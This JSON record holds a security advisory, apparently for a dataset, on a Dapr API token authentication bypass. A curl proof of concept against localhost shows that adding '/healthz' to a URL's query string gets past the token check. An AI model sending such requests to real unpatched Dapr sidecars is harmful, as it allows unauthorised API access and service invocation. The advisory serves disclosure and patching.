{"description": "### Summary\n\n\nA vulnerability has been found in Dapr that allows bypassing [API token authentication](https://docs.dapr.io/operations/security/api-token/), which is used by the Dapr sidecar to authenticate calls coming from the application, with a well-crafted HTTP request.\n\n\nUsers who leverage API token authentication are encouraged to upgrade Dapr to 1.10.9 and 1.11.2.\n\n\n### Impact\n\n\nThis vulnerability impacts Dapr users who have configured API token authentication. An attacker could craft a request that is always allowed by the Dapr sidecar over HTTP, even if the `dapr-api-token` in the request is invalid or missing.\n\n\n### Patches\n\n\nThe issue has been fixed in Dapr 1.10.9 and 1.11.2.\n\n\n### Details\n\n\nWhen API token authentication is enabled, Dapr requires all calls from applications to include the `dapr-api-token` header, with a value matching what's included in the Dapr's configuration. In order to allow for healthchecks to work, the `/v1.0/healthz` and `/v1.0/healthz/outbound` HTTP APIs are excluded from the API token authentication check, and are always allowed.\n\n\nDapr <= 1.10.8 and <= 1.11.1 implemented the allowlisting of the healthcheck endpoints by permitting all requests whose URL contains `/healthz` to bypass the API token authentication check. The match applied anywhere in the URL, including the querystring.\n\n\nAs a consequence, attackers were able to bypass API token authentication by including `/healthz` anywhere in the URL, including as a querystring parameter. This allowed attackers to invoke any Dapr API using HTTP, including perform service invocation.\n\n\n### Proof of Concept\n\n\n```\n$ curl -v http://localhost:3500/v1.0/metadata\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 401 Unauthorized\n< Date: Mon, 17 Jul 2023 18:13:13 GMT\n< Content-Type: text/plain; charset=utf-8\n< Content-Length: 17\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\ninvalid api token\n\n\n$ curl -v http://localhost:3500/v1.0/metadata -H \"dapr-api-token: mytoken\"\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n> dapr-api-token: mytoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:26 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n\n\n$ curl -v http://localhost:3500/v1.0/metadata?foo=/healthz\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata?foo=/healthz HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:44 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n", "methods": ["Bypassed API token authentication by including `/healthz` anywhere in the URL, including as a querystring parameter.", "Exploited allowlisting of healthcheck endpoints by permitting all requests whose URL contains `/healthz` to bypass API token authentication check."]}